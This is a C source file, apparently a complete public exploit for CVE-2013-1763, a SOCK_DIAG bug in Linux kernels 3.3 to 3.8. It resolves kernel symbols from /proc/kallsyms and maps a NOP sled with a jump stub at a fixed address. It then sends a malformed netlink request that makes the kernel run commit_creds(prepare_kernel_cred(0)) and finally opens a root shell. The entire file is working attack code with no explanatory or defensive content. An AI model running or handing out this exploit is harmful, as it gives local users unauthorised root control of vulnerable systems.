/* 
* CVE-2013-1763 SOCK_DIAG bug in kernel 3.3-3.8
* This exploit uses nl_table to jump to a known location
*/

#include <unistd.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <netinet/tcp.h>
#include <errno.h>
#include <linux/if.h>
#include <linux/filter.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <linux/sock_diag.h>
#include <linux/inet_diag.h>
#include <linux/unix_diag.h>
#include <sys/mman.h>

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;
unsigned long sock_diag_handlers, nl_table;

int __attribute__((regparm(3)))
kernel_code()
{
    commit_creds(prepare_kernel_cred(0));
    return -1;
}

unsigned long
get_symbol(char *name)
{
    FILE *f;
    unsigned long addr;
    char dummy, sym[512];
    int ret = 0;
 
    f = fopen("/proc/kallsyms", "r");
    if (!f) {
        return 0;
    }
 
    while (ret != EOF) {
        ret = fscanf(f, "%p %c %s\n", (void **) &addr, &dummy, sym);
        if (ret == 0) {
            fscanf(f, "%s\n", sym);
            continue;
        }
        if (!strcmp(name, sym)) {
            printf("[+] resolved symbol %s to %p\n", name, (void *) addr);
            fclose(f);
            return addr;
        }
    }
    fclose(f);
 
    return 0;
}

int main(int argc, char*argv[])
{
    int fd;
    unsigned family;
    struct {
        struct nlmsghdr nlh;
        struct unix_diag_req r;
    } req;
    char    buf[8192];

    if ((fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_SOCK_DIAG)) < 0){
        printf("Can't create sock diag socket\n");
        return -1;
    }

    memset(&req, 0, sizeof(req));
    req.nlh.nlmsg_len = sizeof(req);
    req.nlh.nlmsg_type = SOCK_DIAG_BY_FAMILY;
    req.nlh.nlmsg_flags = NLM_F_ROOT|NLM_F_MATCH|NLM_F_REQUEST;
    req.nlh.nlmsg_seq = 123456;

    req.r.udiag_states = -1;
    req.r.udiag_show = UDIAG_SHOW_NAME | UDIAG_SHOW_PEER | UDIAG_SHOW_RQLEN;

    commit_creds = (_commit_creds) get_symbol("commit_creds");
    prepare_kernel_cred = (_prepare_kernel_cred) get_symbol("prepare_kernel_cred");
    sock_diag_handlers = get_symbol("sock_diag_handlers");
    nl_table = get_symbol("nl_table");
      
    if(!prepare_kernel_cred || !commit_creds || !sock_diag_handlers || !nl_table){
        printf("some symbols are not available!\n");
        exit(1);
    }

    family = (nl_table - sock_diag_handlers) / 8;
    printf("family=%d\n",family);
    req.r.sdiag_family = family;
      
    if(family>255){
        printf("nl_table is too far!\n");
        exit(1);
    }

    unsigned long mmap_start, mmap_size;
    mmap_start = 0x100000000;
    mmap_size = 0x200000;
    printf("mmapping at 0x%lx, size = 0x%lx\n", mmap_start, mmap_size);

    if (mmap((void*)mmap_start, mmap_size, PROT_READ|PROT_WRITE|PROT_EXEC,
        MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) == MAP_FAILED) {
        printf("mmap fault\n");
        exit(1);
    }
    memset((void*)mmap_start, 0x90, mmap_size);

    char jump[] = "\x55"                          // push %ebp
                  "\x48\x89\xe5"                  // mov %rsp, %rbp
                  "\x48\xc7\xc0\x00\x00\x00\x00"  // movabs 0x00, %rax
                  "\xff\xd0"                      // call *%rax
                  "\x5d"                          // pop %rbp 
                  "\xc3";                         // ret


    unsigned int *asd = (unsigned int*) &jump[7];
    *asd = (unsigned int)kernel_code;
    printf("&kernel_code = %x\n", (unsigned int) kernel_code);

    memcpy( (void*)mmap_start+mmap_size-sizeof(jump), jump, sizeof(jump));

    if ( send(fd, &req, sizeof(req), 0) < 0) {
        printf("bad send\n");
        close(fd);
        return -1;
    }

    printf("uid=%d, euid=%d\n",getuid(), geteuid() );

    if(!getuid())
        system("/bin/sh");

}